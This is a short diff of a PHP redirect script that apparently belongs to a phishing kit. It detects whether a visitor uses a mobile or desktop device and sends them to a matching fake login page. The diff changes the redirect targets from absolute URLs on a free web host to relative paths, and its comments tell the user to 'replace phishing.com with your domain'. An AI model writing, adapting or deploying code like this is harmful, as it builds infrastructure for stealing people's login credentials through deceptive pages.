@@ -20,13 +20,13 @@ else{
   {
     //if visitor of the page is mobile.
     //then show the mobile version.
-    header('Location: https://stark-function.000webhostapp.com/mobile/?id=login'); // just replace phishing.com with your domain.(mobile version)
+    header('Location: mobile/?id=login'); // just replace phishing.com with your domain.(mobile version)
   }
   else
   {
     //if visitor of the page is mobile.
     //then show the desktop version.
-    header("Location: https://stark-function.000webhostapp.com/?id=login"); // same here. (desktop version)
+    header("Location: ?id=login"); // same here. (desktop version)
   }
 }
 ?>
